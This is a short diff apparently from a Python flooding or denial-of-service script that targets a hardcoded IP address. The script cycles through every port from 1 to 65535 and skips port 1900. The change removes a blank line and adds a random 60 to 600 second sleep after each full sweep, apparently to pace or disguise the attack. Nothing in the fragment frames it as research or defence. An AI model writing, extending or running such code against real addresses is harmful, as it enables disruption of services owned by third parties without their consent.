@@ -24,7 +24,6 @@ ip = "163.187.32.26"
 sent = 1
 i = 1
 
-
 # Port selection.
 port_mode = False # If 'False' all ports will be use, if 'True' - certain.
 #port = 1
@@ -37,6 +36,8 @@ if port_mode == False:  # All ports.
             if i == 65535:                
                 i = 1
                 #ip = socket.gethostbyname(url)
+                timeR = random.randint(60,600)
+                time.sleep(timeR)
 
             elif port == 1900:
                 port = 1901
